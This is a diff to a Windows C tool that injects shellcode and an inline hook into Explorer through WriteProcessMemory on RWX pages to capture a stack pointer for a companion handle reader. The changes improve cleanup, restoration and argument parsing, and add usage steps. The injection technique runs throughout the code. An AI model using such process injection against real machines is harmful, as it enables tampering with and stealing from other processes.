@@ -259,14 +259,19 @@ static BOOL ReadRemote(HANDLE process, UINT_PTR address, LPVOID buffer, SIZE_T s
 	return TRUE;
 }
 
-static BOOL WriteRemoteVerified(HANDLE process, UINT_PTR address, LPCVOID buffer, SIZE_T size)
+// The written flag is set as soon as the remote write itself succeeds, before
+// read-back verification: a verification failure must still trigger cleanup of
+// bytes that may have landed in the target.
+static BOOL WriteRemoteVerified(HANDLE process, UINT_PTR address, LPCVOID buffer, SIZE_T size, BOOL* written)
 {
-	SIZE_T written = 0;
-	if (!WriteProcessMemory(process, (LPVOID)address, buffer, size, &written) || written != size)
+	SIZE_T wrote = 0;
+	if (!WriteProcessMemory(process, (LPVOID)address, buffer, size, &wrote) || wrote != size)
 	{
 		fprintf(stderr, "[-] WriteProcessMemory at 0x%llX: E%lu\n", (unsigned long long)address, GetLastError());
 		return FALSE;
 	}
+	if (written)
+		*written = TRUE;
 
 	BYTE readBack[64] = { 0 };
 	if (size > sizeof(readBack))
@@ -493,18 +498,25 @@ static INT CaptureMain(DWORD explorerPid, DWORD timeoutSec)
 	}
 	protectionChanged = TRUE;
 
-	if (!WriteRemoteVerified(explorer, remoteShellcode, shellcode, sizeof(shellcode)))
+	if (!WriteRemoteVerified(explorer, remoteShellcode, shellcode, sizeof(shellcode), &shellcodeWritten))
 		goto _FINAL;
-	shellcodeWritten = TRUE;
 
-	if (!WriteRemoteVerified(explorer, remoteHook, inlineHook, sizeof(inlineHook)))
+	if (!WriteRemoteVerified(explorer, remoteHook, inlineHook, sizeof(inlineHook), &hookWritten))
 		goto _FINAL;
-	hookWritten = TRUE;
 
 	// Protection stays RWX until cleanup: the shellcode writes the RSP slot
 	// (same page as the code) when the hook fires, not when it is installed.
 	printf("[+] Hook and shellcode written and read back\n");
-	printf("[+] Launch a program through Explorer, then press ENTER here (timeout %lu s)\n", timeoutSec);
+	printf(
+		"[+] 1) Launch a program through Explorer itself (double-click in a folder\n"
+		"       window, Win+R, or the Start menu)\n"
+		"[+] 2) When Explorer freezes (the hook fired), run in ANOTHER terminal:\n"
+		"       HandleReader.exe %lu %llX\n"
+		"[+] 3) After the reader succeeds, press ENTER here to restore and resume\n"
+		"       (timeout %lu s; on timeout the same restoration runs)\n",
+		explorerPid,
+		(unsigned long long)remoteRspSlot,
+		timeoutSec);
 
 	BOOL entered = WaitForEnter(timeoutSec);
 	if (!entered)
@@ -515,7 +527,7 @@ static INT CaptureMain(DWORD explorerPid, DWORD timeoutSec)
 _FINAL:
 	if (hookWritten)
 	{
-		hookRestored = WriteRemoteVerified(explorer, remoteHook, originalHook, sizeof(originalHook));
+		hookRestored = WriteRemoteVerified(explorer, remoteHook, originalHook, sizeof(originalHook), NULL);
 		if (!hookRestored)
 		{
 			fprintf(stderr, "[-] Hook restoration FAILED; Explorer may still be hooked\n");
@@ -536,11 +548,26 @@ _FINAL:
 	{
 		if (hookWritten)
 			Sleep(RESUME_GRACE_MS);
-		if (!WriteRemoteVerified(explorer, remoteShellcode, originalPadding, sizeof(originalPadding)))
+		if (!WriteRemoteVerified(explorer, remoteShellcode, originalPadding, sizeof(originalPadding), NULL))
 		{
 			fprintf(stderr, "[-] Shellcode padding restoration FAILED\n");
 			result = EXIT_FAILURE;
 		}
+	}
+
+	// Idempotent: the reader restores the slot after a successful recovery, but
+	// a fired hook without a reader run leaves a stale RSP that the next
+	// capture's INT3 pre-check would reject.
+	if (hookWritten)
+	{
+		const BYTE slotPadding[RSP_SLOT_SIZE] = { 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC };
+		if (!WriteRemoteVerified(explorer, remoteRspSlot, slotPadding, sizeof(slotPadding), NULL))
+		{
+			fprintf(stderr, "[-] RSP slot restoration FAILED; the next capture pre-check will reject this slot\n");
+			result = EXIT_FAILURE;
+		}
+		else
+			printf("[+] RSP slot restored to INT3 padding (capture is repeatable)\n");
 	}
 
 	if (protectionChanged)
@@ -560,13 +587,33 @@ _FINAL:
 	{
 		if (hookWritten)
 			printf(
-				"[+] Restored and resumed Explorer. RSP slot left for the reader:\n"
-				"    HandleReader.exe %lu %llX\n",
-				explorerPid,
-				(unsigned long long)remoteRspSlot);
+				"[+] Restored and resumed Explorer: hook site, shellcode padding,\n"
+				"    RSP slot and page protections returned to their original bytes\n");
 		CloseHandle(explorer);
 	}
 	return result;
+}
+
+// Digits only: rejects signs, whitespace, trailing garbage and overflow, so a
+// value like -1 can never wrap into a huge unsigned wait.
+static BOOL ParseDecimalDword(LPCWSTR text, DWORD* value)
+{
+	if (!text || !*text)
+		return FALSE;
+
+	DWORD result = 0;
+	for (LPCWSTR p = text; *p; ++p)
+	{
+		if (*p < L'0' || *p > L'9')
+			return FALSE;
+		DWORD digit = (DWORD)(*p - L'0');
+		if (result > (MAXDWORD - digit) / 10)
+			return FALSE;
+		result = result * 10 + digit;
+	}
+
+	*value = result;
+	return TRUE;
 }
 
 int wmain(int argc, wchar_t* argv[])
@@ -576,13 +623,8 @@ int wmain(int argc, wchar_t* argv[])
 
 	if (argc == 2 || argc == 4)
 	{
-		if (argv[1][0] == L'-')
-		{
-			fwprintf(stderr, L"[-] Invalid PID: %s\n", argv[1]);
-			return EXIT_FAILURE;
-		}
-		DWORD pid = (DWORD)wcstoul(argv[1], NULL, 10);
-		if (!pid)
+		DWORD pid = 0;
+		if (!ParseDecimalDword(argv[1], &pid) || !pid)
 		{
 			fwprintf(stderr, L"[-] Invalid PID: %s\n", argv[1]);
 			return EXIT_FAILURE;
@@ -596,8 +638,7 @@ int wmain(int argc, wchar_t* argv[])
 				fwprintf(stderr, L"[-] Unknown option: %s\n", argv[2]);
 				return EXIT_FAILURE;
 			}
-			timeout = (DWORD)wcstoul(argv[3], NULL, 10);
-			if (!timeout)
+			if (!ParseDecimalDword(argv[3], &timeout) || !timeout)
 			{
 				fwprintf(stderr, L"[-] Invalid timeout: %s\n", argv[3]);
 				return EXIT_FAILURE;
